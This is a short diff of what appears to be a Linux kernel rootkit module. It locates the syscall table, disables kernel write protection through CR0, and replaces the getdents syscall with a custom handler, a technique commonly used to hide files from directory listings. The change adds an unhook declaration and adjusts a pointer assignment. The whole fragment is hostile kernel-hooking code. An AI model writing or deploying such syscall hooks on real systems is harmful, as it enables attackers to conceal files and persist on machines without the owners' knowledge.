@@ -16,6 +16,7 @@
 unsigned long * sys_call_table;
 unsigned long * find_systable(void);
 int hook_dents(void);
+void unhook_dents(void);
 asmlinkage long (*old_dents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
 asmlinkage long new_dents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
 	//amount of bois
@@ -90,7 +91,8 @@ int hook_dents(void){
 	if (!(sys_call_table = find_systable())){
 		return -1;
 	}
-	old_dents = (void *)sys_call_table[__NR_getdents];
+	old_dents = sys_call_table[__NR_getdents];
+
 	printk(KERN_INFO "what is this boi %d", __NR_getdents);
 	write_cr0(read_cr0() & ~0x10000);
 	sys_call_table[__NR_getdents] = new_dents;
